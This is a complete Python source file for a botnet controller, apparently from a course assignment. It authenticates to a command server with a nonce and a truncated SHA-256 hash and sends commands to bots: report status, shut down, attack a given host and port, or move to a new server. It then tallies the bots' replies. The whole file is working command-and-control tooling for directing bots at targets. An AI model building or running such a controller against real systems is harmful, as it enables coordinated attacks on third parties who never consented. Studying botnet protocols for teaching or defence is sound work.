#!/usr/bin/env python3

import sys
import socket
import time
import hashlib
import select
import random

def compute_mac(nonce, secret):
    combo = nonce + secret
    sha_val = hashlib.sha256(combo.encode('utf-8')).hexdigest()
    return sha_val[:8]

def generate_nonce():
    """Generate a random numeric nonce. Could also be a random integer or string."""
    return str(random.randint(100000, 999999))

def collect_responses(sock, timeout=5):
    """
    Collect lines from the server for 'timeout' seconds.
    Return them as a list of lines (strings, stripped).
    """
    start_time = time.time()
    received_lines = []

    # We might accumulate partial data; keep a buffer
    buffer_data = ""

    while True:
        # Check time
        if time.time() - start_time > timeout:
            break

        # Use select to see if there's data ready
        rlist, _, _ = select.select([sock], [], [], 0.2)
        if sock in rlist:
            try:
                data = sock.recv(4096)
                if not data:
                    # Connection closed
                    break
                buffer_data += data.decode('utf-8', errors='ignore')
                # Split on newlines
                while "\n" in buffer_data:
                    line, buffer_data = buffer_data.split("\n", 1)
                    received_lines.append(line.strip())
            except:
                break

    return received_lines

def parse_status_responses(lines):
    """
    Each status response is "-status <nick> <count>".
    Return a list of tuples (nick, count).
    """
    results = []
    for line in lines:
        if line.startswith("-status "):
            parts = line.split()
            if len(parts) == 3:
                # e.g., ["-status", "<nick>", "<count>"]
                nick = parts[1]
                count = parts[2]
                results.append((nick, count))
    return results

def parse_shutdown_responses(lines):
    """
    Each shutdown response is "-shutdown <nick>".
    Return a list of nicknames.
    """
    nicks = []
    for line in lines:
        if line.startswith("-shutdown "):
            parts = line.split()
            if len(parts) == 2:
                nicks.append(parts[1])
    return nicks

def parse_attack_responses(lines):
    """
    Each attack response is "-attack <nick> OK" or "-attack <nick> FAIL <error>".
    Return two dicts: successes and failures.
    successes => {nick: True}
    failures => {nick: <errorString>}
    """
    successes = {}
    failures = {}
    for line in lines:
        if line.startswith("-attack "):
            parts = line.split(None, 3)
            # e.g. "-attack <nick> OK"
            if len(parts) >= 3:
                nick = parts[1]
                result = parts[2]
                if result == "OK":
                    successes[nick] = True
                elif result == "FAIL":
                    # parts[3] might be the reason
                    if len(parts) == 4:
                        failures[nick] = parts[3]
                    else:
                        failures[nick] = "unknown"
    return successes, failures

def parse_move_responses(lines):
    """
    Each move response is "-move <nick>".
    Return a list of nicknames that moved.
    """
    nicks = []
    for line in lines:
        if line.startswith("-move "):
            parts = line.split()
            if len(parts) == 2:
                nicks.append(parts[1])
    return nicks

def main():
    if len(sys.argv) != 3:
        print("Usage: ./nccontroller.py <hostname>:<port> <secret>")
        sys.exit(1)

    hostport = sys.argv[1].split(":")
    if len(hostport) != 2:
        print("Error: invalid <hostname>:<port>")
        sys.exit(1)

    host = hostport[0]
    port = int(hostport[1])
    secret = sys.argv[2]

    # Attempt to connect
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(f"Connected to {host}:{port}.")
    except Exception as e:
        print(f"Failed to connect to {host}:{port} - {e}")
        sys.exit(1)

    while True:
        try:
            cmdline = input("cmd> ").strip()
        except EOFError:
            print("EOF encountered, quitting.")
            break
        except KeyboardInterrupt:
            print("\nKeyboard interrupt, quitting.")
            break

        if not cmdline:
            continue

        parts = cmdline.split()
        command = parts[0].lower()

        if command == "quit":
            # Disconnect and exit
            s.close()
            print("Disconnected.")
            sys.exit(0)

        elif command == "status":
            nonce = generate_nonce()
            mac = compute_mac(nonce, secret)
            msg = f"{nonce} {mac} status\n"
            s.sendall(msg.encode('utf-8'))
            lines = collect_responses(s, timeout=5)
            st = parse_status_responses(lines)
            if st:
                print(f"  Waiting 5s to gather replies.")
                print(f"  Result: {len(st)} bots replied.")
                listing = []
                for nick, cnt in st:
                    listing.append(f"{nick} ({cnt})")
                print(f"    {', '.join(listing)}")
            else:
                print("  Result: 0 bots replied.")

        elif command == "shutdown":
            nonce = generate_nonce()
            mac = compute_mac(nonce, secret)
            msg = f"{nonce} {mac} shutdown\n"
            s.sendall(msg.encode('utf-8'))
            lines = collect_responses(s, timeout=5)
            nicks = parse_shutdown_responses(lines)
            if nicks:
                print(f"  Waiting 5s to gather replies.")
                print(f"  Result: {len(nicks)} bots shut down.")
                print(f"    {', '.join(nicks)}")
            else:
                print("  Result: 0 bots shut down.")

        elif command == "attack":
            # usage: attack <hostname>:<port>
            if len(parts) < 2:
                print("Error: attack requires <hostname>:<port>")
                continue
            target = parts[1]
            nonce = generate_nonce()
            mac = compute_mac(nonce, secret)
            msg = f"{nonce} {mac} attack {target}\n"
            s.sendall(msg.encode('utf-8'))
            lines = collect_responses(s, timeout=5)
            succ, fail = parse_attack_responses(lines)
            total_ok = len(succ)
            total_fail = len(fail)
            print(f"  Waiting 5s to gather replies.")
            print(f"  Result: {total_ok} bots attacked successfully:")
            if total_ok > 0:
                print(f"    {', '.join(succ.keys())}")
            print(f"  {total_fail} bots failed to attack:")
            if total_fail > 0:
                for k,v in fail.items():
                    print(f"    {k}: {v}")

        elif command == "move":
            # usage: move <hostname>:<port>
            if len(parts) < 2:
                print("Error: move requires <hostname>:<port>")
                continue
            new_target = parts[1]
            nonce = generate_nonce()
            mac = compute_mac(nonce, secret)
            msg = f"{nonce} {mac} move {new_target}\n"
            s.sendall(msg.encode('utf-8'))
            lines = collect_responses(s, timeout=5)
            mvnicks = parse_move_responses(lines)
            if mvnicks:
                print(f"  Waiting 5s to gather replies.")
                print(f"  Result: {len(mvnicks)} bots moved.")
                print(f"    {', '.join(mvnicks)}")
            else:
                print("  Result: 0 bots moved.")

        else:
            print("Unknown command. Valid commands: status, shutdown, attack <h:p>, move <h:p>, quit.")

    s.close()
    print("Bye.")

if __name__ == "__main__":
    main()
